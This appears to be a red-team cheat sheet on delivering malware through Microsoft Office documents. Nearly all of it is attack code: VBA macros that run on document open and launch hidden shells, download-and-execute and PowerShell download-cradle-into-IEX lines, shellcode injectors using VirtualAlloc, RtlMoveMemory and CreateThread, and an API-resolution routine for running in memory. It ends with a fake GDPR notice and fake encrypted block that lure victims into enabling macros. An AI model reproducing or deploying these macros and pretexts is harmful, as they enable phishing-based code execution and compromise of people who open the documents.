# Delivery using office documents
---
## VBA hello world
```vb
Sub MyMacro()
    Dim name As String
    Dim age As Long
    Dim pointer As LongPtr
    
    age = 18
    If age >= 18 Then
        MsgBox ("if")
    Else
        MsgBox ("else")
    End If

    For i = 1 To 4
        MsgBox (i)
    Next i

	Dim cmd1 As String  
	cmd1 = "cmd.exe"  
	Shell cmd1, vbHide

	Dim cmd2 As String  
	cmd2 = "cmd.exe"  
	CreateObject("Wscript.Shell").Run cmd2, 0
End Sub
```
---
## Autorun VBA macro when document or workbook is opened
```vb
Sub Document_Open()
	MyMacro
End Sub

Sub Workbook_Open()
	MyMacro
End Sub

Sub AutoOpen()
	MyMacro
End Sub
```
---
## Download to disk and execute
```vb

Sub MyMacro()
    Dim downloader As String
    downloader = "powershell.exe (New-Object Net.WebClient).DownloadFile('URL', 'OUTFILE')"
    CreateObject("Wscript.Shell").Run downloader, 0

    Wait (4)

    Dim executalbe As String
    executalbe = ActiveDocument.path + "\OUTFILE"
    Shell executalbe, bvHide
End Sub

Sub Wait(delay As Long)
    Dim start As Date
    start = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", delay, start)
End Sub
```
---
## Injecting shellcode into WINWORD.exe
```vb
' https://www.pinvoke.net/default.aspx/kernel32.CreateThread
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
' https://www.pinvoke.net/default.aspx/kernel32.VirtualAlloc
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
' https://www.pinvoke.net/default.aspx/kernel32.RtlMoveMemory
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim i As Long
    Dim data As Long
    Dim res As LongPtr

    'buf = msfvenom ... EXITFUNC=thread -f vbapplication

    ' TODO: not rwx, but rw- then r-x
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    For i = LBound(buff) To UBound(buf)
        data = buf(i)
        res = RtlMoveMemory(addr + i, data, 1)
    Next i

    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function
```
---
## Injecting shellcode into powershell.exe
```powershell
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@
Add-Type $Kernel32

[Byte[]] $buf = # msfvenom ... EXITFUNC=thread -f ps1
$size = $buf.Length
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size);
$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

```vb
Sub MyMacro()
	Dim str As String
	str = "powershell (New-ObjectSystem.Net.WebClient).DownloadString('URL') | IEX"
	Shell str, vbHide
End Sub
```

# resolve win32 api without writing to disk
```powershell
function LookupFunc {
	Param ($moduleName, $functionName)
	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$tmp=@()
	$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}
function getDelegateType {
	Param ( [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func, [Parameter(Position = 1)] [Type] $delType = [Void])
	$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
	$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
	return $type.CreateType()
}
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

---
## Pretexting
To comply with GDPR please Enable Editing and Enable Content shown above

-------- RSA ENCRYPTED BLOCK --------
base64==
-------- RSA ENCRYPTED BLOCK --------

select decrypted text and navigate to Insert > Quick Parts > AutoTexts and Save Selection to AutoText Gallery, with the name Content

then "decrypt" the page using this macro

```vb
Sub Decrypt()
    ActiveDocument.Content.Select
    Selection.Delete
    ActiveDocument.AttachedTemplate.AutoTextEntries("Content").Insert Where:=Selection.Range, RichText:=True
End Sub
```